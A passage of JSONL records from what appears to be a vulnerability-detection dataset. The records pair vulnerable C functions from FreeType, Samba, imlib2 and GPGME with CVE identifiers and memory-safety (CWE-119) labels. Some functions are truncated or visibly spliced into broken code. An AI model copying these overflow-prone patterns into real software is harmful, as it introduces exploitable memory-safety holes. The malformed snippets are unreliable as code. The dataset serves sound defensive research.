(FT_Vector*)( (FT_Pos*)CUR.pts.org + 1 );\n      V.curs = (FT_Vector*)( (FT_Pos*)CUR.pts.cur + 1 );\n      V.orus = (FT_Vector*)( (FT_Pos*)CUR.pts.orus + 1 );\n    }\n    V.max_points = CUR.pts.n_points;\n\n    contour = 0;\n    point   = 0;\n\n    do\n    {\n       end_point   = CUR.pts.contours[contour] - CUR.pts.first_point;\n       first_point = point;\n \n      if ( CUR.pts.n_points <= end_point )\n        end_point = CUR.pts.n_points;\n \n       while ( point <= end_point && ( CUR.pts.tags[point] & mask ) == 0 )\n         point++;\n\n      if ( point <= end_point )\n      {\n        first_touched = point;\n        cur_touched   = point;\n\n        point++;\n\n        while ( point <= end_point )\n        {\n          if ( ( CUR.pts.tags[point] & mask ) != 0 )\n          {\n            if ( point > 0 )\n              _iup_worker_interpolate( &V,\n                                       cur_touched + 1,\n                                       point - 1,\n                                       cur_touched,\n                                       point );\n            cur_touched = point;\n          }\n\n          point++;\n        }\n\n        if ( cur_touched == first_touched )\n          _iup_worker_shift( &V, first_point, end_point, cur_touched );\n        else\n        {\n          _iup_worker_interpolate( &V,\n                                   (FT_UShort)( cur_touched + 1 ),\n                                   end_point,\n                                   cur_touched,\n                                   first_touched );\n\n          if ( first_touched > 0 )\n            _iup_worker_interpolate( &V,\n                                     first_point,\n                                     first_touched - 1,\n                                     cur_touched,\n                                     first_touched );\n        }\n      }\n      contour++;\n    } while ( contour < CUR.pts.n_contours );\n  }\n", "func_hash": 271982803099189327229111379866845675067, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2010-2520", "cve_desc": "Heap-based buffer overflow in the Ins_IUP function in truetype/ttinterp.c in FreeType before 2.4.0, when TrueType bytecode support is enabled, allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2520"}
{"idx": 264, "project": "savannah", "commit_id": "b2ea64bcc6c385a8e8318f9c759450a07df58b6d", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=b2ea64bcc6c385a8e8318f9c759450a07df58b6d", "commit_message": "None", "target": 1, "func": "  Mac_Read_POST_Resource( FT_Library  library,\n                          FT_Stream   stream,\n                          FT_Long    *offsets,\n                          FT_Long     resource_cnt,\n                          FT_Long     face_index,\n                          FT_Face    *aface )\n  {\n    FT_Error   error  = FT_Err_Cannot_Open_Resource;\n    FT_Memory  memory = library->memory;\n    FT_Byte*   pfb_data;\n    int        i, type, flags;\n    FT_Long    len;\n    FT_Long    pfb_len, pfb_pos, pfb_lenpos;\n    FT_Long    rlen, temp;\n\n\n    if ( face_index == -1 )\n      face_index = 0;\n    if ( face_index != 0 )\n      return error;\n\n    /* Find the length of all the POST resources, concatenated.  Assume */\n    /* worst case (each resource in its own section).                   */\n    pfb_len = 0;\n    for ( i = 0; i < resource_cnt; ++i )\n    {\n      error = FT_Stream_Seek( stream, offsets[i] );\n      if ( error )\n        goto Exit;\n      if ( FT_READ_LONG( temp ) )\n        goto Exit;\n      pfb_len += temp + 6;\n    }\n\n    if ( FT_ALLOC( pfb_data, (FT_Long)pfb_len + 2 ) )\n      goto Exit;\n\n    pfb_data[0] = 0x80;\n    pfb_data[1] = 1;            /* Ascii section */\n    pfb_data[2] = 0;            /* 4-byte length, fill in later */\n    pfb_data[3] = 0;\n    pfb_data[4] = 0;\n    pfb_data[5] = 0;\n    pfb_pos     = 6;\n    pfb_lenpos  = 2;\n\n    len = 0;\n    type = 1;\n    for ( i = 0; i < resource_cnt; ++i )\n    {\n      error = FT_Stream_Seek( stream, offsets[i] );\n      if ( error )\n        goto Exit2;\n      if ( FT_READ_LONG( rlen ) )\n        goto Exit;\n      if ( FT_READ_USHORT( flags ) )\n        goto Exit;\n       FT_TRACE3(( \"POST fragment[%d]: offsets=0x%08x, rlen=0x%08x, flags=0x%04x\\n\",\n                    i, offsets[i], rlen, flags ));\n \n       /* the flags are part of the resource, so rlen >= 2.  */\n       /* but some fonts declare rlen = 0 for empty fragment */\n       if ( rlen > 2 )\n\n      if ( ( flags >> 8 ) == type )\n        len += rlen;\n      else\n      {\n        if ( pfb_lenpos + 3 > pfb_len + 2 )\n          goto Exit2;\n        pfb_data[pfb_lenpos    ] = (FT_Byte)( len );\n        pfb_data[pfb_lenpos + 1] = (FT_Byte)( len >> 8 );\n        pfb_data[pfb_lenpos + 2] = (FT_Byte)( len >> 16 );\n        pfb_data[pfb_lenpos + 3] = (FT_Byte)( len >> 24 );\n\n        if ( ( flags >> 8 ) == 5 )      /* End of font mark */\n          break;\n\n        if ( pfb_pos + 6 > pfb_len + 2 )\n          goto Exit2;\n        pfb_data[pfb_pos++] = 0x80;\n\n        type = flags >> 8;\n        len = rlen;\n\n        pfb_data[pfb_pos++] = (FT_Byte)type;\n        pfb_lenpos          = pfb_pos;\n        pfb_data[pfb_pos++] = 0;        /* 4-byte length, fill in later */\n        pfb_data[pfb_pos++] = 0;\n        pfb_data[pfb_pos++] = 0;\n        pfb_data[pfb_pos++] = 0;\n      }\n\n      error = FT_Stream_Read( stream, (FT_Byte *)pfb_data + pfb_pos, rlen );\n      if ( error )\n        goto Exit2;\n      pfb_pos += rlen;\n    }\n\n    if ( pfb_pos + 2 > pfb_len + 2 )\n      goto Exit2;\n    pfb_data[pfb_pos++] = 0x80;\n    pfb_data[pfb_pos++] = 3;\n\n    if ( pfb_lenpos + 3 > pfb_len + 2 )\n      goto Exit2;\n    pfb_data[pfb_lenpos    ] = (FT_Byte)( len );\n    pfb_data[pfb_lenpos + 1] = (FT_Byte)( len >> 8 );\n    pfb_data[pfb_lenpos + 2] = (FT_Byte)( len >> 16 );\n    pfb_data[pfb_lenpos + 3] = (FT_Byte)( len >> 24 );\n\n    return open_face_from_buffer( library,\n                                  pfb_data,\n                                  pfb_pos,\n                                  face_index,\n                                  \"type1\",\n                                  aface );\n\n  Exit2:\n    FT_FREE( pfb_data );\n\n  Exit:\n    return error;\n  }\n", "func_hash": 239474837185248719277265167606864341043, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2010-2519", "cve_desc": "Heap-based buffer overflow in the Mac_Read_POST_Resource function in base/ftobjs.c in FreeType before 2.4.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted length value in a POST fragment header in a font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2519"}
{"idx": 267, "project": "savannah", "commit_id": "c69891a1345640096fbf396e8dd567fe879ce233", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c69891a1345640096fbf396e8dd567fe879ce233", "commit_message": "None", "target": 1, "func": "  Mac_Read_POST_Resource( FT_Library  library,\n                          FT_Stream   stream,\n                          FT_Long    *offsets,\n                          FT_Long     resource_cnt,\n                          FT_Long     face_index,\n                          FT_Face    *aface )\n  {\n    FT_Error   error  = FT_Err_Cannot_Open_Resource;\n    FT_Memory  memory = library->memory;\n    FT_Byte*   pfb_data;\n    int        i, type, flags;\n    FT_Long    len;\n    FT_Long    pfb_len, pfb_pos, pfb_lenpos;\n    FT_Long    rlen, temp;\n\n\n    if ( face_index == -1 )\n      face_index = 0;\n    if ( face_index != 0 )\n      return error;\n\n    /* Find the length of all the POST resources, concatenated.  Assume */\n    /* worst case (each resource in its own section).                   */\n    pfb_len = 0;\n    for ( i = 0; i < resource_cnt; ++i )\n    {\n      error = FT_Stream_Seek( stream, offsets[i] );\n      if ( error )\n        goto Exit;\n      if ( FT_READ_LONG( temp ) )\n        goto Exit;\n      pfb_len += temp + 6;\n    }\n\n    if ( FT_ALLOC( pfb_data, (FT_Long)pfb_len + 2 ) )\n      goto Exit;\n\n    pfb_data[0] = 0x80;\n    pfb_data[1] = 1;            /* Ascii section */\n    pfb_data[2] = 0;            /* 4-byte length, fill in later */\n    pfb_data[3] = 0;\n    pfb_data[4] = 0;\n    pfb_data[5] = 0;\n    pfb_pos     = 6;\n    pfb_lenpos  = 2;\n\n    len = 0;\n    type = 1;\n    for ( i = 0; i < resource_cnt; ++i )\n    {\n      error = FT_Stream_Seek( stream, offsets[i] );\n      if ( error )\n        goto Exit2;\n      if ( FT_READ_LONG( rlen ) )\n        goto Exit;\n      if ( FT_READ_USHORT( flags ) )\n        goto Exit;\n      rlen -= 2;                    /* the flags are part of the resource */\n      if ( ( flags >> 8 ) == type )\n        len += rlen;\n      else\n      {\n        pfb_data[pfb_lenpos    ] = (FT_Byte)( len );\n        pfb_data[pfb_lenpos + 1] = (FT_Byte)( len >> 8 );\n        pfb_data[pfb_lenpos + 2] = (FT_Byte)( len >> 16 );\n        pfb_data[pfb_lenpos + 3] = (FT_Byte)( len >> 24 );\n\n        if ( ( flags >> 8 ) == 5 )      /* End of font mark */\n          break;\n\n        pfb_data[pfb_pos++] = 0x80;\n\n        type = flags >> 8;\n        len = rlen;\n\n        pfb_data[pfb_pos++] = (FT_Byte)type;\n        pfb_lenpos          = pfb_pos;\n        pfb_data[pfb_pos++] = 0;        /* 4-byte length, fill in later */\n        pfb_data[pfb_pos++] = 0;\n        pfb_data[pfb_pos++] = 0;\n        pfb_data[pfb_pos++] = 0;\n       }\n \n       error = FT_Stream_Read( stream, (FT_Byte *)pfb_data + pfb_pos, rlen );\n       pfb_pos += rlen;\n     }\n\n    pfb_data[pfb_lenpos    ] = (FT_Byte)( len );\n    pfb_data[pfb_lenpos + 1] = (FT_Byte)( len >> 8 );\n    pfb_data[pfb_lenpos + 2] = (FT_Byte)( len >> 16 );\n    pfb_data[pfb_lenpos + 3] = (FT_Byte)( len >> 24 );\n\n    return open_face_from_buffer( library,\n                                  pfb_data,\n                                  pfb_pos,\n                                  face_index,\n                                  \"type1\",\n                                  aface );\n\n  Exit2:\n    FT_FREE( pfb_data );\n\n  Exit:\n    return error;\n  }\n", "func_hash": 66761366277063878236162927407801840545, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2010-2499", "cve_desc": "Buffer overflow in the Mac_Read_POST_Resource function in base/ftobjs.c in FreeType before 2.4.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted LaserWriter PS font file with an embedded PFB fragment.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2499"}
{"idx": 287, "project": "samba", "commit_id": "9280051bfba337458722fb157f3082f93cbd9f2b", "project_url": "https://github.com/samba-team/samba", "commit_url": "https://git.samba.org/?p=samba.git;a=commit;h=9280051bfba337458722fb157f3082f93cbd9f2b", "commit_message": "s3: Fix an uninitialized variable read\n\nFound by Laurent Gaffie <laurent.gaffie@gmail.com>\n\nThanks for that,\n\nVolker\n\nFix bug #7254 (An uninitialized variable read could cause an smbd crash).", "target": 1, "func": "static void reply_sesssetup_and_X_spnego(struct smb_request *req)\n{\n\tconst uint8 *p;\n\tDATA_BLOB blob1;\n\tsize_t bufrem;\n\tchar *tmp;\n\tconst char *native_os;\n\tconst char *native_lanman;\n\tconst char *primary_domain;\n\tconst char *p2;\n\tuint16 data_blob_len = SVAL(req->vwv+7, 0);\n\tenum remote_arch_types ra_type = get_remote_arch();\n\tint vuid = req->vuid;\n\tuser_struct *vuser = NULL;\n\tNTSTATUS status = NT_STATUS_OK;\n\tuint16 smbpid = req->smbpid;\n\tstruct smbd_server_connection *sconn = smbd_server_conn;\n\n\tDEBUG(3,(\"Doing spnego session setup\\n\"));\n\n\tif (global_client_caps == 0) {\n\t\tglobal_client_caps = IVAL(req->vwv+10, 0);\n\n\t\tif (!(global_client_caps & CAP_STATUS32)) {\n\t\t\tremove_from_common_flags2(FLAGS2_32_BIT_ERROR_CODES);\n\t\t}\n\n\t}\n\n\tp = req->buf;\n\n\tif (data_blob_len == 0) {\n\t\t/* an invalid request */\n\t\treply_nterror(req, nt_status_squash(NT_STATUS_LOGON_FAILURE));\n\t\treturn;\n\t}\n\n\tbufrem = smbreq_bufrem(req, p);\n\t/* pull the spnego blob */\n\tblob1 = data_blob(p, MIN(bufrem, data_blob_len));\n\n#if 0\n        file_save(\"negotiate.dat\", blob1.data, blob1.length);\n #endif\n \n       p2 = (char *)req->buf + data_blob_len;\n \n        p2 += srvstr_pull_req_talloc(talloc_tos(), req, &tmp, p2,\n                                     STR_TERMINATE);\n\tnative_os = tmp ? tmp : \"\";\n\n\tp2 += srvstr_pull_req_talloc(talloc_tos(), req, &tmp, p2,\n\t\t\t\t     STR_TERMINATE);\n\tnative_lanman = tmp ? tmp : \"\";\n\n\tp2 += srvstr_pull_req_talloc(talloc_tos(), req, &tmp, p2,\n\t\t\t\t     STR_TERMINATE);\n\tprimary_domain = tmp ? tmp : \"\";\n\n\tDEBUG(3,(\"NativeOS=[%s] NativeLanMan=[%s] PrimaryDomain=[%s]\\n\",\n\t\tnative_os, native_lanman, primary_domain));\n\n\tif ( ra_type == RA_WIN2K ) {\n\t\t/* Vista sets neither the OS or lanman strings */\n\n\t\tif ( !strlen(native_os) && !strlen(native_lanman) )\n\t\t\tset_remote_arch(RA_VISTA);\n\n\t\t/* Windows 2003 doesn't set the native lanman string,\n\t\t   but does set primary domain which is a bug I think */\n\n\t\tif ( !strlen(native_lanman) ) {\n\t\t\tra_lanman_string( primary_domain );\n\t\t} else {\n\t\t\tra_lanman_string( native_lanman );\n\t\t}\n\t}\n\n\t/* Did we get a valid vuid ? */\n\tif (!is_partial_auth_vuid(sconn, vuid)) {\n\t\t/* No, then try and see if this is an intermediate sessionsetup\n\t\t * for a large SPNEGO packet. */\n\t\tstruct pending_auth_data *pad;\n\t\tpad = get_pending_auth_data(sconn, smbpid);\n\t\tif (pad) {\n\t\t\tDEBUG(10,(\"reply_sesssetup_and_X_spnego: found \"\n\t\t\t\t\"pending vuid %u\\n\",\n\t\t\t\t(unsigned int)pad->vuid ));\n\t\t\tvuid = pad->vuid;\n\t\t}\n\t}\n\n\t/* Do we have a valid vuid now ? */\n\tif (!is_partial_auth_vuid(sconn, vuid)) {\n\t\t/* No, start a new authentication setup. */\n\t\tvuid = register_initial_vuid(sconn);\n\t\tif (vuid == UID_FIELD_INVALID) {\n\t\t\tdata_blob_free(&blob1);\n\t\t\treply_nterror(req, nt_status_squash(\n\t\t\t\t\t      NT_STATUS_INVALID_PARAMETER));\n\t\t\treturn;\n\t\t}\n\t}\n\n\tvuser = get_partial_auth_user_struct(sconn, vuid);\n\t/* This MUST be valid. */\n\tif (!vuser) {\n\t\tsmb_panic(\"reply_sesssetup_and_X_spnego: invalid vuid.\");\n\t}\n\n\t/* Large (greater than 4k) SPNEGO blobs are split into multiple\n\t * sessionsetup requests as the Windows limit on the security blob\n\t * field is 4k. Bug #4400. JRA.\n\t */\n\n\tstatus = check_spnego_blob_complete(sconn, smbpid, vuid, &blob1);\n\tif (!NT_STATUS_IS_OK(status)) {\n\t\tif (!NT_STATUS_EQUAL(status,\n\t\t\t\tNT_STATUS_MORE_PROCESSING_REQUIRED)) {\n\t\t\t/* Real error - kill the intermediate vuid */\n\t\t\tinvalidate_vuid(sconn, vuid);\n\t\t}\n\t\tdata_blob_free(&blob1);\n\t\treply_nterror(req, nt_status_squash(status));\n\t\treturn;\n\t}\n\n\tif (blob1.data[0] == ASN1_APPLICATION(0)) {\n\n\t\t/* its a negTokenTarg packet */\n\n\t\treply_spnego_negotiate(req, vuid, blob1,\n\t\t\t\t       &vuser->auth_ntlmssp_state);\n\t\tdata_blob_free(&blob1);\n\t\treturn;\n\t}\n\n\tif (blob1.data[0] == ASN1_CONTEXT(1)) {\n\n\t\t/* its a auth packet */\n\n\t\treply_spnego_auth(req, vuid, blob1,\n\t\t\t\t  &vuser->auth_ntlmssp_state);\n\t\tdata_blob_free(&blob1);\n\t\treturn;\n\t}\n\n\tif (strncmp((char *)(blob1.data), \"NTLMSSP\", 7) == 0) {\n\t\tDATA_BLOB chal;\n\n\t\tif (!vuser->auth_ntlmssp_state) {\n\t\t\tstatus = auth_ntlmssp_start(&vuser->auth_ntlmssp_state);\n\t\t\tif (!NT_STATUS_IS_OK(status)) {\n\t\t\t\t/* Kill the intermediate vuid */\n\t\t\t\tinvalidate_vuid(sconn, vuid);\n\t\t\t\tdata_blob_free(&blob1);\n\t\t\t\treply_nterror(req, nt_status_squash(status));\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\n\t\tstatus = auth_ntlmssp_update(vuser->auth_ntlmssp_state,\n\t\t\t\t\t\tblob1, &chal);\n\n\t\tdata_blob_free(&blob1);\n\n\t\treply_spnego_ntlmssp(req, vuid,\n\t\t\t\t     &vuser->auth_ntlmssp_state,\n\t\t\t\t     &chal, status, OID_NTLMSSP, false);\n\t\tdata_blob_free(&chal);\n\t\treturn;\n\t}\n\n\t/* what sort of packet is this? */\n\tDEBUG(1,(\"Unknown packet in reply_sesssetup_and_X_spnego\\n\"));\n\n\tdata_blob_free(&blob1);\n\n\treply_nterror(req, nt_status_squash(NT_STATUS_LOGON_FAILURE));\n}\n", "func_hash": 252100526266913255109910552885875245221, "file_name": "sesssetup.c", "file_hash": 150796593669683248561162249993165628892, "cwe": ["CWE-119"], "cve": "CVE-2010-1642", "cve_desc": "The reply_sesssetup_and_X_spnego function in sesssetup.c in smbd in Samba before 3.4.8 and 3.5.x before 3.5.2 allows remote attackers to trigger an out-of-bounds read, and cause a denial of service (process crash), via a \\xff\\xff security blob length in a Session Setup AndX request.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-1642"}
{"idx": 289, "project": "enlightment", "commit_id": "37a96801663b7b4cd3fbe56cc0eb8b6a17e766a8", "project_url": "https://git.enlightenment.org/legacy/imlib2", "commit_url": "https://git.enlightenment.org/legacy/imlib2.git/commit/?id=37a96801663b7b4cd3fbe56cc0eb8b6a17e766a8", "commit_message": "None", "target": 1, "func": "load(ImlibImage * im, ImlibProgressFunction progress, char progress_granularity,\n     char immediate_load)\n{\n   static const int    intoffset[] = { 0, 4, 2, 1 };\n   static const int    intjump[] = { 8, 8, 4, 2 };\n   int                 rc;\n   DATA32             *ptr;\n   GifFileType        *gif;\n   GifRowType         *rows;\n   GifRecordType       rec;\n   ColorMapObject     *cmap;\n   int                 i, j, done, bg, r, g, b, w = 0, h = 0;\n   float               per = 0.0, per_inc;\n   int                 last_per = 0, last_y = 0;\n   int                 transp;\n   int                 fd;\n\n   done = 0;\n   rows = NULL;\n   transp = -1;\n\n   /* if immediate_load is 1, then dont delay image laoding as below, or */\n   /* already data in this image - dont load it again */\n   if (im->data)\n      return 0;\n\n   fd = open(im->real_file, O_RDONLY);\n   if (fd < 0)\n      return 0;\n\n#if GIFLIB_MAJOR >= 5\n   gif = DGifOpenFileHandle(fd, NULL);\n#else\n   gif = DGifOpenFileHandle(fd);\n#endif\n   if (!gif)\n     {\n        close(fd);\n        return 0;\n     }\n\n   rc = 0;                      /* Failure */\n\n   do\n     {\n        if (DGifGetRecordType(gif, &rec) == GIF_ERROR)\n          {\n             /* PrintGifError(); */\n             rec = TERMINATE_RECORD_TYPE;\n          }\n        if ((rec == IMAGE_DESC_RECORD_TYPE) && (!done))\n          {\n             if (DGifGetImageDesc(gif) == GIF_ERROR)\n               {\n                  /* PrintGifError(); */\n                  rec = TERMINATE_RECORD_TYPE;\n                  break;\n               }\n             w = gif->Image.Width;\n             h = gif->Image.Height;\n             if (!IMAGE_DIMENSIONS_OK(w, h))\n                goto quit2;\n\n             rows = calloc(h, sizeof(GifRowType *));\n             if (!rows)\n                goto quit2;\n\n             for (i = 0; i < h; i++)\n               {\n                  rows[i] = calloc(w, sizeof(GifPixelType));\n                  if (!rows[i])\n                     goto quit;\n               }\n\n             if (gif->Image.Interlace)\n               {\n                  for (i = 0; i < 4; i++)\n                    {\n                       for (j = intoffset[i]; j < h; j += intjump[i])\n                         {\n                            DGifGetLine(gif, rows[j], w);\n                         }\n                    }\n               }\n             else\n               {\n                  for (i = 0; i < h; i++)\n                    {\n                       DGifGetLine(gif, rows[i], w);\n                    }\n               }\n             done = 1;\n          }\n        else if (rec == EXTENSION_RECORD_TYPE)\n          {\n             int                 ext_code;\n             GifByteType        *ext;\n\n             ext = NULL;\n             DGifGetExtension(gif, &ext_code, &ext);\n             while (ext)\n               {\n                  if ((ext_code == 0xf9) && (ext[1] & 1) && (transp < 0))\n                    {\n                       transp = (int)ext[4];\n                    }\n                  ext = NULL;\n                  DGifGetExtensionNext(gif, &ext);\n               }\n          }\n     }\n   while (rec != TERMINATE_RECORD_TYPE);\n\n   if (transp >= 0)\n     {\n        SET_FLAG(im->flags, F_HAS_ALPHA);\n     }\n   else\n     {\n        UNSET_FLAG(im->flags, F_HAS_ALPHA);\n     }\n   if (!rows)\n     {\n        goto quit2;\n     }\n\n   /* set the format string member to the lower-case full extension */\n   /* name for the format - so example names would be: */\n   /* \"png\", \"jpeg\", \"tiff\", \"ppm\", \"pgm\", \"pbm\", \"gif\", \"xpm\" ... */\n   im->w = w;\n   im->h = h;\n   if (!im->format)\n      im->format = strdup(\"gif\");\n \n    if (im->loader || immediate_load || progress)\n      {\n         bg = gif->SBackGroundColor;\n         cmap = (gif->Image.ColorMap ? gif->Image.ColorMap : gif->SColorMap);\n         im->data = (DATA32 *) malloc(sizeof(DATA32) * w * h);\n         if (!im->data)\n            goto quit;\n                    {\n                       r = cmap->Colors[bg].Red;\n                       g = cmap->Colors[bg].Green;\n                       b = cmap->Colors[bg].Blue;\n                       *ptr++ = 0x00ffffff & ((r << 16) | (g << 8) | b);\n                    }\n                  else\n                    {\n                       r = cmap->Colors[rows[i][j]].Red;\n                       g = cmap->Colors[rows[i][j]].Green;\n                       b = cmap->Colors[rows[i][j]].Blue;\n                       *ptr++ = (0xff << 24) | (r << 16) | (g << 8) | b;\n           {\n              for (j = 0; j < w; j++)\n                {\n                  if (rows[i][j] == transp)\n                    {\n                       r = cmap->Colors[bg].Red;\n                       g = cmap->Colors[bg].Green;\n                       b = cmap->Colors[bg].Blue;\n                       *ptr++ = 0x00ffffff & ((r << 16) | (g << 8) | b);\n                    }\n                  else\n                    {\n                       r = cmap->Colors[rows[i][j]].Red;\n                       g = cmap->Colors[rows[i][j]].Green;\n                       b = cmap->Colors[rows[i][j]].Blue;\n                       *ptr++ = (0xff << 24) | (r << 16) | (g << 8) | b;\n                    }\n                   per += per_inc;\n                   if (progress && (((int)per) != last_per)\n                       && (((int)per) % progress_granularity == 0))\n                         {\n                            rc = 2;\n                            goto quit;\n                         }\n                       last_y = i;\n                    }\n               }\n          }\n\n      finish:\n        if (progress)\n           progress(im, 100, 0, last_y, w, h);\n     }\n\n   rc = 1;                      /* Success */\n\n quit:\n   for (i = 0; i < h; i++)\n      free(rows[i]);\n   free(rows);\n\n quit2:\n#if GIFLIB_MAJOR > 5 || (GIFLIB_MAJOR == 5 && GIFLIB_MINOR >= 1)\n   DGifCloseFile(gif, NULL);\n#else\n   DGifCloseFile(gif);\n#endif\n\n   return rc;\n}\n", "func_hash": 29413401693515776488286177132255863480, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-3994", "cve_desc": "The GIF loader in imlib2 before 1.4.9 allows remote attackers to cause a denial of service (application crash) or obtain sensitive information via a crafted image, which triggers an out-of-bounds read.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-3994"}
{"idx": 290, "project": "enlightment", "commit_id": "ce94edca1ccfbe314cb7cd9453433fad404ec7ef", "project_url": "https://git.enlightenment.org/legacy/imlib2", "commit_url": "https://git.enlightenment.org/legacy/imlib2.git/commit/?id=ce94edca1ccfbe314cb7cd9453433fad404ec7ef", "commit_message": "None", "target": 1, "func": "__imlib_MergeUpdate(ImlibUpdate * u, int w, int h, int hgapmax)\n{\n   ImlibUpdate        *nu = NULL, *uu;\n   struct _tile       *t;\n   int                 tw, th, x, y, i;\n   int                *gaps = NULL;\n\n   /* if theres no rects to process.. return NULL */\n   if (!u)\n      return NULL;\n   tw = w >> TB;\n   if (w & TM)\n      tw++;\n   th = h >> TB;\n   if (h & TM)\n      th++;\n   t = malloc(tw * th * sizeof(struct _tile));\n   /* fill in tiles to be all not used */\n   for (i = 0, y = 0; y < th; y++)\n     {\n        for (x = 0; x < tw; x++)\n           t[i++].used = T_UNUSED;\n     }\n   /* fill in all tiles */\n   for (uu = u; uu; uu = uu->next)\n     {\n        CLIP(uu->x, uu->y, uu->w, uu->h, 0, 0, w, h);\n        for (y = uu->y >> TB; y <= ((uu->y + uu->h - 1) >> TB); y++)\n          {\n             for (x = uu->x >> TB; x <= ((uu->x + uu->w - 1) >> TB); x++)\n                T(x, y).used = T_USED;\n          }\n     }\n   /* scan each line - if > hgapmax gaps between tiles, then fill smallest */\n   gaps = malloc(tw * sizeof(int));\n   for (y = 0; y < th; y++)\n     {\n        int                 hgaps = 0, start = -1, min;\n        char                have = 1, gap = 0;\n\n        for (x = 0; x < tw; x++)\n           gaps[x] = 0;\n        for (x = 0; x < tw; x++)\n          {\n             if ((have) && (T(x, y).used == T_UNUSED))\n               {\n                  start = x;\n                  gap = 1;\n                  have = 0;\n               }\n             else if ((!have) && (gap) && (T(x, y).used & T_USED))\n               {\n                  gap = 0;\n                  hgaps++;\n                  have = 1;\n                  gaps[start] = x - start;\n               }\n             else if (T(x, y).used & T_USED)\n                have = 1;\n          }\n        while (hgaps > hgapmax)\n          {\n             start = -1;\n             min = tw;\n\n             for (x = 0; x < tw; x++)\n               {\n                  if ((gaps[x] > 0) && (gaps[x] < min))\n                    {\n                       start = x;\n                       min = gaps[x];\n                    }\n               }\n             if (start >= 0)\n               {\n                  gaps[start] = 0;\n                  for (x = start;\n                       T(x, y).used == T_UNUSED; T(x++, y).used = T_USED);\n                  hgaps--;\n               }\n          }\n     }\n   free(gaps);\n   /* coalesce tiles into larger blocks and make new rect list */\n   for (y = 0; y < th; y++)\n     {\n        for (x = 0; x < tw; x++)\n          {\n             if (T(x, y).used & T_USED)\n               {\n                   int                 xx, yy, ww, hh, ok, xww;\n \n                   for (xx = x + 1, ww = 1;\n                       (T(xx, y).used & T_USED) && (xx < tw); xx++, ww++);\n                   xww = x + ww;\n                   for (yy = y + 1, hh = 1, ok = 1;\n                        (yy < th) && (ok); yy++, hh++)\n                    {\n                       for (xx = x; xx < xww; xx++)\n                         {\n                            if (!(T(xx, yy).used & T_USED))\n                              {\n                                 ok = 0;\n                                 hh--;\n                                 break;\n                              }\n                         }\n                    }\n                  for (yy = y; yy < (y + hh); yy++)\n                    {\n                       for (xx = x; xx < xww; xx++)\n                          T(xx, yy).used = T_UNUSED;\n                    }\n                  nu = __imlib_AddUpdate(nu, (x << TB), (y << TB),\n                                         (ww << TB), (hh << TB));\n               }\n          }\n     }\n   free(t);\n   __imlib_FreeUpdates(u);\n   return nu;\n}\n", "func_hash": 36599931638812584056030971307038057704, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-3993", "cve_desc": "Off-by-one error in the __imlib_MergeUpdate function in lib/updates.c in imlib2 before 1.4.9 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via crafted coordinates.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-3993"}
{"idx": 354, "project": "gnupg", "commit_id": "2cbd76f7911fc215845e89b50d6af5ff4a83dd77", "project_url": "http://git.gnupg.org/cgi-bin/gitweb.cgi?p=gnupg", "commit_url": "https://git.gnupg.org/cgi-bin/gitweb.cgi?p=gpgme.git;a=commit;h=2cbd76f7911fc215845e89b50d6af5ff4a83dd77", "commit_message": "None", "target": 1, "func": "status_handler (void *opaque, int fd)\n{\n  struct io_cb_data *data = (struct io_cb_data *) opaque;\n  engine_gpgsm_t gpgsm = (engine_gpgsm_t) data->handler_value;\n  gpgme_error_t err = 0;\n  char *line;\n  size_t linelen;\n\n  do\n    {\n      err = assuan_read_line (gpgsm->assuan_ctx, &line, &linelen);\n      if (err)\n\t{\n\t  /* Try our best to terminate the connection friendly.  */\n\t  /*\t  assuan_write_line (gpgsm->assuan_ctx, \"BYE\"); */\n          TRACE3 (DEBUG_CTX, \"gpgme:status_handler\", gpgsm,\n\t\t  \"fd 0x%x: error from assuan (%d) getting status line : %s\",\n                  fd, err, gpg_strerror (err));\n\t}\n      else if (linelen >= 3\n\t       && line[0] == 'E' && line[1] == 'R' && line[2] == 'R'\n\t       && (line[3] == '\\0' || line[3] == ' '))\n\t{\n\t  if (line[3] == ' ')\n\t    err = atoi (&line[4]);\n\t  if (! err)\n\t    err = gpg_error (GPG_ERR_GENERAL);\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", gpgsm,\n\t\t  \"fd 0x%x: ERR line - mapped to: %s\",\n                  fd, err ? gpg_strerror (err) : \"ok\");\n\t  /* Try our best to terminate the connection friendly.  */\n\t  /*\t  assuan_write_line (gpgsm->assuan_ctx, \"BYE\"); */\n\t}\n      else if (linelen >= 2\n\t       && line[0] == 'O' && line[1] == 'K'\n\t       && (line[2] == '\\0' || line[2] == ' '))\n\t{\n\t  if (gpgsm->status.fnc)\n\t    err = gpgsm->status.fnc (gpgsm->status.fnc_value,\n\t\t\t\t     GPGME_STATUS_EOF, \"\");\n\n\t  if (!err && gpgsm->colon.fnc && gpgsm->colon.any)\n            {\n              /* We must tell a colon function about the EOF. We do\n                 this only when we have seen any data lines.  Note\n                 that this inlined use of colon data lines will\n                 eventually be changed into using a regular data\n                 channel. */\n              gpgsm->colon.any = 0;\n              err = gpgsm->colon.fnc (gpgsm->colon.fnc_value, NULL);\n            }\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", gpgsm,\n\t\t  \"fd 0x%x: OK line - final status: %s\",\n                  fd, err ? gpg_strerror (err) 